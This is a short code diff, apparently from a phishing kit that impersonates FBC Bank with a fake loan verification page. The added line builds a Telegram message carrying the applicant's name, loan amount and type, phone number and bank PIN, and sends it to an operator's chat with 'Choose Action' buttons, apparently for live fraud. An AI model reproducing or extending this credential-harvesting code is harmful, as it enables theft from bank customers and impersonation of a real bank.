@@ -524,12 +524,7 @@
         body: JSON.stringify({
           chat_id: CONFIG.CHAT_ID,
           text: `
-<b>📱 FBC Bank Loan Verification</b>
-
-Mobile: <code>${mobile}</code>
-Applicant: <code>monthlyIncome</code>
-fullName: " "
-`,
+<b>📱 FBC Bank Loan Verification</b><b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
           parse_mode: 'HTML',
           reply_markup: {
             inline_keyboard: [
